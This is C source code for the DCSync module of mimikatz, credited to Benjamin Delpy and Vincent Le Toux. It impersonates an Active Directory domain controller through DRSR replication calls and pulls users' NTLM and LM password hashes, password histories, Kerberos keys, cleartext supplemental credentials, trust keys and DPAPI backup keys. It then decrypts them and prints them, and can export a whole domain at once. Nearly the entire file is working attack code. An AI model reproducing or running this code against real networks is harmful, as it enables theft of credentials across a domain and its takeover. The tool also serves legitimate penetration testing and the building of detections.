/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com

	Vincent LE TOUX
	http://pingcastle.com / http://mysmartlogon.com
	vincent.letoux@gmail.com

	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_lsadump_dc.h"

LPCSTR kuhl_m_lsadump_dcsync_oids[] = {
	szOID_ANSI_name,
	szOID_ANSI_sAMAccountName, szOID_ANSI_userPrincipalName, szOID_ANSI_sAMAccountType,
	szOID_ANSI_userAccountControl, szOID_ANSI_accountExpires, szOID_ANSI_pwdLastSet,
	szOID_ANSI_objectSid, szOID_ANSI_sIDHistory,
	szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
	szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
	szOID_ANSI_currentValue,
};
LPCSTR kuhl_m_lsadump_dcsync_oids_export[] = {
	szOID_ANSI_name,
	szOID_ANSI_sAMAccountName, szOID_ANSI_objectSid,
	szOID_ANSI_unicodePwd
};
NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
{
	LSA_OBJECT_ATTRIBUTES objectAttributes = {0};
	PPOLICY_DNS_DOMAIN_INFO pPolicyDnsDomainInfo = NULL;
	RPC_BINDING_HANDLE hBinding;
	DRS_HANDLE hDrs = NULL;
	DSNAME dsName = {0};
	DRS_MSG_GETCHGREQ getChReq = {0};
	DWORD dwOutVersion = 0, i;
	DRS_MSG_GETCHGREPLY getChRep;
	ULONG drsStatus;
	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL, szService;
	LPWSTR szTmpDc = NULL;
	DRS_EXTENSIONS_INT DrsExtensionsInt;
	BOOL someExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL), allData = kull_m_string_args_byName(argc, argv, L"all", NULL, NULL), csvOutput = kull_m_string_args_byName(argc, argv, L"csv", NULL, NULL);
	
	if(!kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
		if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
			szDomain = pPolicyDnsDomainInfo->DnsDomainName.Buffer;

	if(szDomain && wcschr(szDomain, L'.'))
	{
		kprintf(L"[DC] \'%s\' will be the domain\n", szDomain);
		if(!(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL) || kull_m_string_args_byName(argc, argv, L"kdc", &szDc, NULL)))
			if(kull_m_net_getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &szTmpDc))
				szDc = szTmpDc;
		
		if(szDc)
		{
			kprintf(L"[DC] \'%s\' will be the DC server\n", szDc);
			if(allData || kull_m_string_args_byName(argc, argv, L"guid", &szGuid, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
			{
				if(allData)
					kprintf(L"[DC] Exporting domain \'%s\'\n", szDomain);
				else if(szGuid)
					kprintf(L"[DC] Object with GUID \'%s\'\n", szGuid);
				else
					kprintf(L"[DC] \'%s\' will be the user account\n", szUser);

				kull_m_string_args_byName(argc, argv, L"altservice", &szService, L"ldap");
				if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE, (MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
				{
					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt))
					{
						if(DrsExtensionsInt.dwReplEpoch)
							kprintf(L"[DC] ms-DS-ReplicationEpoch is: %u\n", DrsExtensionsInt.dwReplEpoch);
						if(kull_m_rpc_drsr_getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs, &DrsExtensionsInt))
						{
							getChReq.V8.pNC = &dsName;
							getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
							getChReq.V8.cMaxObjects = (allData ? 1000 : 1);
							getChReq.V8.cMaxBytes = 0x00a00000; // 10M
							getChReq.V8.ulExtendedOp = (allData ? 0 : EXOP_REPL_OBJ);

							if(getChReq.V8.pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT *) MIDL_user_allocate(sizeof(PARTIAL_ATTR_VECTOR_V1_EXT) + sizeof(ATTRTYP) * ((allData ? ARRAYSIZE(kuhl_m_lsadump_dcsync_oids_export) : ARRAYSIZE(kuhl_m_lsadump_dcsync_oids)) - 1)))
							{
								getChReq.V8.pPartialAttrSet->dwVersion = 1;
								getChReq.V8.pPartialAttrSet->dwReserved1 = 0;
								if (allData)
								{
									getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(kuhl_m_lsadump_dcsync_oids_export);
									for(i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
										kull_m_rpc_drsr_MakeAttid(&getChReq.V8.PrefixTableDest, kuhl_m_lsadump_dcsync_oids_export[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
								}
								else
								{
									getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(kuhl_m_lsadump_dcsync_oids);
									for(i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
										kull_m_rpc_drsr_MakeAttid(&getChReq.V8.PrefixTableDest, kuhl_m_lsadump_dcsync_oids[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
								}
								RpcTryExcept
								{
									do
									{
										RtlZeroMemory(&getChRep, sizeof(DRS_MSG_GETCHGREPLY));
										drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
										if(drsStatus == 0)
										{
											if(dwOutVersion == 6 && (allData || getChRep.V6.cNumObjects == 1))
											{
												if(kull_m_rpc_drsr_ProcessGetNCChangesReply(&getChRep.V6.PrefixTableSrc, getChRep.V6.pObjects))
												{
													REPLENTINFLIST* pObject = getChRep.V6.pObjects;
													for (i = 0; i < getChRep.V6.cNumObjects; i++)
													{
														if (csvOutput)
															kuhl_m_lsadump_dcsync_descrObject_csv(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock);
														else
															kuhl_m_lsadump_dcsync_descrObject(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, szDomain, someExport);
														pObject = pObject->pNextEntInf;
													}
												}
												else
												{
													PRINT_ERROR(L"kull_m_rpc_drsr_ProcessGetNCChangesReply\n");
													break;
												}
												if(allData)
												{
													RtlCopyMemory(&getChReq.V8.uuidInvocIdSrc, &getChRep.V6.uuidInvocIdSrc, sizeof(UUID));
													RtlCopyMemory(&getChReq.V8.usnvecFrom, &getChRep.V6.usnvecTo, sizeof(USN_VECTOR));
												}
											}
											else PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion (%u) and/or cNumObjects (%u)\n", dwOutVersion, getChRep.V6.cNumObjects);
											kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data(dwOutVersion, &getChRep);
											
										}
										else PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);
									}
									while(getChRep.V6.fMoreData);
									IDL_DRSUnbind(&hDrs);
								}
								RpcExcept(RPC_EXCEPTION)
									PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
								RpcEndExcept

								kull_m_rpc_drsr_free_SCHEMA_PREFIX_TABLE_data(&getChReq.V8.PrefixTableDest);
								MIDL_user_free(getChReq.V8.pPartialAttrSet);
							}
						}
					}
					kull_m_rpc_deleteBinding(&hBinding);
				}
			}
			else PRINT_ERROR(L"Missing user or guid argument\n");
		}
		else PRINT_ERROR(L"Domain Controller not present\n");
	}
	else PRINT_ERROR(L"Domain not present, or doesn\'t look like a FQDN\n");

	if(szTmpDc)
		LocalFree(szTmpDc);
	if(pPolicyDnsDomainInfo)
		LsaFreeMemory(pPolicyDnsDomainInfo);

	return STATUS_SUCCESS;
}

BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory)
{
	DWORD i;
	BOOL status = FALSE;
	BYTE data[LM_NTLM_HASH_LENGTH];
	for(i = 0; i < encodedDataSize; i+= LM_NTLM_HASH_LENGTH)
	{
		status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(encodedData + i, &rid, data));
		if(status)
		{
			if(isHistory)
				kprintf(L"    %s-%2u: ", prefix, i / LM_NTLM_HASH_LENGTH);
			else
				kprintf(L"  Hash %s: ", prefix);
			kull_m_string_wprintf_hex(data, LM_NTLM_HASH_LENGTH, 0);
			kprintf(L"\n");
		}
		else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
	}
	return status;
}

void kuhl_m_lsadump_dcsync_descrObject_csv(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes)
{
	DWORD rid = 0;
	PBYTE unicodePwd;
	DWORD unicodePwdSize;
	PVOID sid;
	BYTE clearHash[LM_NTLM_HASH_LENGTH];
	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, NULL, NULL) &&
		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_objectSid, &sid, NULL) &&
		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_unicodePwd, &unicodePwd, &unicodePwdSize))
	{
		rid = *GetSidSubAuthority(sid, *GetSidSubAuthorityCount(sid) - 1);
		kprintf(L"%u\t", rid);
		kull_m_rpc_drsr_findPrintMonoAttr(NULL, prefixTable, attributes, szOID_ANSI_sAMAccountName, FALSE);
		kprintf(L"\t");
		if(NT_SUCCESS(RtlDecryptDES2blocks1DWORD(unicodePwd, &rid, clearHash)))
			kull_m_string_wprintf_hex(clearHash, LM_NTLM_HASH_LENGTH, 0);
		else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
		kprintf(L"\n");
	}
}

void kuhl_m_lsadump_dcsync_descrObject(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCWSTR szSrcDomain, BOOL someExport)
{
	kull_m_rpc_drsr_findPrintMonoAttr(L"\nObject RDN           : ", prefixTable, attributes, szOID_ANSI_name, TRUE);
	kprintf(L"\n");
	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, NULL, NULL))
		kuhl_m_lsadump_dcsync_descrUser(prefixTable, attributes);
	else if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_trustPartner, NULL, NULL))
		kuhl_m_lsadump_dcsync_descrTrust(prefixTable, attributes, szSrcDomain);
	else if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_currentValue, NULL, NULL))
		kuhl_m_lsadump_dcsync_descrSecret(prefixTable, attributes, someExport);
}

const wchar_t * KUHL_M_LSADUMP_UF_FLAG[] = {
	L"SCRIPT", L"ACCOUNTDISABLE", L"0x4 ?", L"HOMEDIR_REQUIRED", L"LOCKOUT", L"PASSWD_NOTREQD", L"PASSWD_CANT_CHANGE", L"ENCRYPTED_TEXT_PASSWORD_ALLOWED",
	L"TEMP_DUPLICATE_ACCOUNT", L"NORMAL_ACCOUNT", L"0x400 ?", L"INTERDOMAIN_TRUST_ACCOUNT", L"WORKSTATION_TRUST_ACCOUNT", L"SERVER_TRUST_ACCOUNT", L"0x4000 ?", L"0x8000 ?",
	L"DONT_EXPIRE_PASSWD", L"MNS_LOGON_ACCOUNT", L"SMARTCARD_REQUIRED", L"TRUSTED_FOR_DELEGATION", L"NOT_DELEGATED", L"USE_DES_KEY_ONLY", L"DONT_REQUIRE_PREAUTH", L"PASSWORD_EXPIRED", 
	L"TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION", L"NO_AUTH_DATA_REQUIRED", L"PARTIAL_SECRETS_ACCOUNT", L"USE_AES_KEYS", L"0x10000000 ?", L"0x20000000 ?", L"0x40000000 ?", L"0x80000000 ?",
};

LPCWSTR kuhl_m_lsadump_samAccountType_toString(DWORD accountType)
{
	LPCWSTR target;
	switch(accountType)
	{
	case SAM_DOMAIN_OBJECT:
		target = L"DOMAIN_OBJECT";
		break;
	case SAM_GROUP_OBJECT:
		target = L"GROUP_OBJECT";
		break;
	case SAM_NON_SECURITY_GROUP_OBJECT:
		target = L"NON_SECURITY_GROUP_OBJECT";
		break;
	case SAM_ALIAS_OBJECT:
		target = L"ALIAS_OBJECT";
		break;
	case SAM_NON_SECURITY_ALIAS_OBJECT:
		target = L"NON_SECURITY_ALIAS_OBJECT";
		break;
	case SAM_USER_OBJECT:
		target = L"USER_OBJECT";
		break;
	case SAM_MACHINE_ACCOUNT:
		target = L"MACHINE_ACCOUNT";
		break;
	case SAM_TRUST_ACCOUNT:
		target = L"TRUST_ACCOUNT";
		break;
	case SAM_APP_BASIC_GROUP:
		target = L"APP_BASIC_GROUP";
		break;
	case SAM_APP_QUERY_GROUP:
		target = L"APP_QUERY_GROUP";
		break;
	default:
		target = L"unknown";
	}
	return target;
}

void kuhl_m_lsadump_dcsync_descrUser(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes)
{
	DWORD rid = 0, i;
	PBYTE encodedData;
	DWORD encodedDataSize;
	PVOID data;
	ATTRVALBLOCK *sids;
	
	kprintf(L"** SAM ACCOUNT **\n\n");
	kull_m_rpc_drsr_findPrintMonoAttr(L"SAM Username         : ", prefixTable, attributes, szOID_ANSI_sAMAccountName, TRUE);
	kull_m_rpc_drsr_findPrintMonoAttr(L"User Principal Name  : ", prefixTable, attributes, szOID_ANSI_userPrincipalName, TRUE);
	
	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountType, &data, NULL))
		kprintf(L"Account Type         : %08x ( %s )\n", *(PDWORD) data, kuhl_m_lsadump_samAccountType_toString(*(PDWORD) data));

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_userAccountControl, &data, NULL))
	{
		kprintf(L"User Account Control : %08x ( ", *(PDWORD) data);
		for(i = 0; i < min(ARRAYSIZE(KUHL_M_LSADUMP_UF_FLAG), sizeof(DWORD) * 8); i++)
			if((1 << i) & *(PDWORD) data)
				kprintf(L"%s ", KUHL_M_LSADUMP_UF_FLAG[i]);
		kprintf(L")\n");
	}

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_accountExpires, &data, NULL))
	{
		kprintf(L"Account expiration   : ");
		kull_m_string_displayLocalFileTime((LPFILETIME) data);
		kprintf(L"\n");
	}

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_pwdLastSet, &data, NULL))
	{
		kprintf(L"Password last change : ");
		kull_m_string_displayLocalFileTime((LPFILETIME) data);
		kprintf(L"\n");
	}
	
	if(sids = kull_m_rpc_drsr_findAttr(prefixTable, attributes, szOID_ANSI_sIDHistory))
	{
		kprintf(L"SID history:\n");
		for(i = 0; i < sids->valCount; i++)
		{
			kprintf(L"  ");
			kull_m_string_displaySID(sids->pAVal[i].pVal);
			kprintf(L"\n");
		}
	}

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_objectSid, &data, NULL))
	{
		kprintf(L"Object Security ID   : ");
		kull_m_string_displaySID(data);
		kprintf(L"\n");
		rid = *GetSidSubAuthority(data, *GetSidSubAuthorityCount(data) - 1);
		kprintf(L"Object Relative ID   : %u\n", rid);

		kprintf(L"\nCredentials:\n");
		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_unicodePwd, &encodedData, &encodedDataSize))
			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"NTLM", FALSE);
		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_ntPwdHistory, &encodedData, &encodedDataSize))
			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"ntlm", TRUE);
		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_dBCSPwd, &encodedData, &encodedDataSize))
			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"LM  ", FALSE);
		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_lmPwdHistory, &encodedData, &encodedDataSize))
			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"lm  ", TRUE);
	}

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_supplementalCredentials, &encodedData, &encodedDataSize))
	{
		kprintf(L"\nSupplemental Credentials:\n");
		kuhl_m_lsadump_dcsync_descrUserProperties((PUSER_PROPERTIES) encodedData);
	}
}

DECLARE_CONST_UNICODE_STRING(PrimaryCleartext, L"Primary:CLEARTEXT");
DECLARE_CONST_UNICODE_STRING(PrimaryWDigest, L"Primary:WDigest");
DECLARE_CONST_UNICODE_STRING(PrimaryKerberos, L"Primary:Kerberos");
DECLARE_CONST_UNICODE_STRING(PrimaryKerberosNew, L"Primary:Kerberos-Newer-Keys");
DECLARE_CONST_UNICODE_STRING(PrimaryNtlmStrongNTOWF, L"Primary:NTLM-Strong-NTOWF");
DECLARE_CONST_UNICODE_STRING(Packages, L"Packages");
void kuhl_m_lsadump_dcsync_descrUserProperties(PUSER_PROPERTIES properties)
{
	DWORD i, j, k, szData;
	PUSER_PROPERTY property;
	PBYTE data;
	UNICODE_STRING Name;
	LPSTR value;

	PWDIGEST_CREDENTIALS pWDigest;
	PKERB_STORED_CREDENTIAL pKerb;
	PKERB_KEY_DATA pKeyData;
	PKERB_STORED_CREDENTIAL_NEW pKerbNew;
	PKERB_KEY_DATA_NEW pKeyDataNew;

	if(properties->Length > (FIELD_OFFSET(USER_PROPERTIES, PropertyCount) - FIELD_OFFSET(USER_PROPERTIES, Reserved4)))
	{
		if((properties->PropertySignature == L'P') && properties->PropertyCount)
		{
			for(i = 0, property = properties->UserProperties; i < properties->PropertyCount; i++, property = (PUSER_PROPERTY) ((PBYTE) property + FIELD_OFFSET(USER_PROPERTY, PropertyName) + property->NameLength + property->ValueLength))
			{
				Name.Length = Name.MaximumLength = property->NameLength;
				Name.Buffer = property->PropertyName;

				value = (LPSTR) ((LPCBYTE) property->PropertyName + property->NameLength);
				szData = property->ValueLength / 2;

				kprintf(L"* %wZ *\n", &Name);
				if(data = (PBYTE) LocalAlloc(LPTR, szData))
				{
					for(j = 0; j < szData; j++)
					{
						sscanf_s(&value[j*2], "%02x", &k);
						data[j] = (BYTE) k;
					}

					if(RtlEqualUnicodeString(&PrimaryCleartext, &Name, TRUE) || RtlEqualUnicodeString(&Packages, &Name, TRUE))
					{
						kprintf(L"    %.*s\n", szData / sizeof(wchar_t), (PWSTR) data);
					}
					else if(RtlEqualUnicodeString(&PrimaryWDigest, &Name, TRUE))
					{
						pWDigest = (PWDIGEST_CREDENTIALS) data;
						for(j = 0; j < pWDigest->NumberOfHashes; j++)
						{
							kprintf(L"    %02u  ", j + 1);
							kull_m_string_wprintf_hex(pWDigest->Hash[j], MD5_DIGEST_LENGTH, 0);
							kprintf(L"\n");
						}
					}
					else if(RtlEqualUnicodeString(&PrimaryKerberos, &Name, TRUE))
					{
						pKerb = (PKERB_STORED_CREDENTIAL) data;
						kprintf(L"    Default Salt : %.*s\n", pKerb->DefaultSaltLength / sizeof(wchar_t), (PWSTR) ((PBYTE) pKerb + pKerb->DefaultSaltOffset));
						pKeyData = (PKERB_KEY_DATA) ((PBYTE) pKerb + sizeof(KERB_STORED_CREDENTIAL));
						pKeyData = kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->CredentialCount, L"Credentials");
						kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->OldCredentialCount, L"OldCredentials");
					}
					else if(RtlEqualUnicodeString(&PrimaryKerberosNew, &Name, TRUE))
					{
						pKerbNew = (PKERB_STORED_CREDENTIAL_NEW) data;
						kprintf(L"    Default Salt : %.*s\n    Default Iterations : %u\n", pKerbNew->DefaultSaltLength / sizeof(wchar_t), (PWSTR) ((PBYTE) pKerbNew + pKerbNew->DefaultSaltOffset), pKerbNew->DefaultIterationCount);
						pKeyDataNew = (PKERB_KEY_DATA_NEW) ((PBYTE) pKerbNew + sizeof(KERB_STORED_CREDENTIAL_NEW));
						pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->CredentialCount, L"Credentials");
						pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->ServiceCredentialCount, L"ServiceCredentials");
						pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OldCredentialCount, L"OldCredentials");
						kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OlderCredentialCount, L"OlderCredentials");
					}
					else if(RtlEqualUnicodeString(&PrimaryNtlmStrongNTOWF, &Name, TRUE))
					{
						kprintf(L"    Random Value : ");
						kull_m_string_wprintf_hex(data, szData, 0);
						kprintf(L"\n");
					}
					else
					{
						kprintf(L"    Unknown data : ");
						kull_m_string_wprintf_hex(data, szData, 1);
						kprintf(L"\n");
					}
					kprintf(L"\n");
					LocalFree(data);
				}
			}
		}
	}
}

void kuhl_m_lsadump_dcsync_descrTrust(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCWSTR szSrcDomain)
{
	PBYTE encodedData;
	DWORD encodedDataSize;
	UNICODE_STRING uPartner, uDomain, uUpcasePartner, uUpcaseDomain;
	
	kprintf(L"** TRUSTED DOMAIN - Antisocial **\n\n");
	
	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_trustPartner, &encodedData, &encodedDataSize))
	{
		uPartner.Length = uPartner.MaximumLength = (USHORT) encodedDataSize;
		uPartner.Buffer = (PWSTR) encodedData;
		kprintf(L"Partner              : %wZ\n", &uPartner);
		if(NT_SUCCESS(RtlUpcaseUnicodeString(&uUpcasePartner, &uPartner, TRUE)))
		{
			RtlInitUnicodeString(&uDomain, szSrcDomain);
			if(NT_SUCCESS(RtlUpcaseUnicodeString(&uUpcaseDomain, &uDomain, TRUE)))
			{
				kuhl_m_lsadump_dcsync_descrTrustAuthentication(prefixTable, attributes, &uUpcaseDomain, &uUpcasePartner, TRUE);
				kuhl_m_lsadump_dcsync_descrTrustAuthentication(prefixTable, attributes, &uUpcaseDomain, &uUpcasePartner, FALSE);
				RtlFreeUnicodeString(&uUpcaseDomain);
			}
			RtlFreeUnicodeString(&uUpcasePartner);
		}
	}
}

void kuhl_m_lsadump_dcsync_descrTrustAuthentication(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, PCUNICODE_STRING domain, PCUNICODE_STRING partner, BOOL isIn)
{
	PBYTE encodedData;
	DWORD encodedDataSize;
	PNTDS_LSA_AUTH_INFORMATIONS authInfos;
	LPCWSTR prefix, prefixOld;
	PCUNICODE_STRING from, dest;

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, isIn ? szOID_ANSI_trustAuthIncoming : szOID_ANSI_trustAuthOutgoing, &encodedData, &encodedDataSize))
	{
		if(isIn)
		{
			prefix = L"  In ";
			prefixOld = L" In-1";
			from = domain;
			dest = partner;
		}
		else
		{
			prefix = L" Out ";
			prefixOld = L"Out-1";
			from = partner;
			dest = domain;
		}
		authInfos = (PNTDS_LSA_AUTH_INFORMATIONS) encodedData;
		if(authInfos->count)
		{
			if(authInfos->offsetToAuthenticationInformation)
				kuhl_m_lsadump_trust_authinformation(NULL, 0, (PNTDS_LSA_AUTH_INFORMATION) ((PBYTE) authInfos + FIELD_OFFSET(NTDS_LSA_AUTH_INFORMATIONS, count) + authInfos->offsetToAuthenticationInformation), prefix, from, dest);
			if(authInfos->offsetToPreviousAuthenticationInformation)
				kuhl_m_lsadump_trust_authinformation(NULL, 0, (PNTDS_LSA_AUTH_INFORMATION) ((PBYTE) authInfos + FIELD_OFFSET(NTDS_LSA_AUTH_INFORMATIONS, count) + authInfos->offsetToPreviousAuthenticationInformation), prefixOld, from, dest);
		}
	}
}

void kuhl_m_lsadump_dcsync_descrSecret(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, BOOL someExport)
{
	PVOID data;
	PWSTR name, ptr;
	DWORD size;
	USHORT szGuid;
	GUID guid;
	UNICODE_STRING uGuid;

	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_name, &data, &size))
	{
		if(name = (PWSTR) LocalAlloc(LPTR, size + sizeof(wchar_t)))
		{
			RtlCopyMemory(name, data, size);
			if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_currentValue, &data, &size))
			{
				if(name == wcsstr(name, L"BCKUPKEY_"))
				{
					if(((_wcsicmp(name, L"BCKUPKEY_P Secret") == 0) || (_wcsicmp(name, L"BCKUPKEY_PREFERRED Secret") == 0)) && (size = sizeof(GUID)))
					{
						kprintf(L"Link to key with GUID: ");
						kull_m_string_displayGUID((LPCGUID) data);
						kprintf(L" (not an object GUID)\n");
					}
					else if(ptr = wcschr(name + 9, L' '))
					{
						szGuid = (USHORT) ((ptr - (name + 9)) * sizeof(wchar_t));
						uGuid.Length = uGuid.MaximumLength = szGuid + (2 * sizeof(wchar_t));
						if(uGuid.Buffer = (PWSTR) LocalAlloc(LPTR, uGuid.MaximumLength))
						{
							uGuid.Buffer[0] = L'{';
							RtlCopyMemory(uGuid.Buffer + 1, name + 9, szGuid);
							uGuid.Buffer[(uGuid.Length >> 1) - 1] = L'}';
							if(NT_SUCCESS(RtlGUIDFromString(&uGuid, &guid)))
								kuhl_m_lsadump_analyzeKey(&guid, (PKIWI_BACKUP_KEY) data, size, someExport);
							LocalFree(uGuid.Buffer);
						}
					}
				}
				else kull_m_string_wprintf_hex(data, size, 1 | (16 << 16));
			}
			LocalFree(name);
		}
	}
}

//NTSTATUS kuhl_m_lsadump_dc...(int argc, wchar_t * argv[])
//{
//
//}

void __RPC_USER SRV_DRS_HANDLE_rundown(DRS_HANDLE hDrs)
{
}

ULONG SRV_IDL_DRSBind(handle_t rpc_handle, UUID *puuidClientDsa, DRS_EXTENSIONS *pextClient, DRS_EXTENSIONS **ppextServer, DRS_HANDLE *phDrs)
{
	return STATUS_NOT_IMPLEMENTED;
}

ULONG SRV_IDL_DRSUnbind(DRS_HANDLE *phDrs)
{
	return STATUS_NOT_IMPLEMENTED;
}

ULONG SRV_IDL_DRSGetNCChanges(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_GETCHGREQ *pmsgIn, DWORD *pdwOutVersion, DRS_MSG_GETCHGREPLY *pmsgOut)
{
	return STATUS_NOT_IMPLEMENTED;
}

ULONG SRV_IDL_DRSUpdateRefs(DRS_HANDLE hDrs, DWORD dwVersion, DRS_MSG_UPDREFS *pmsgUpdRefs)
{
	return STATUS_NOT_IMPLEMENTED;
}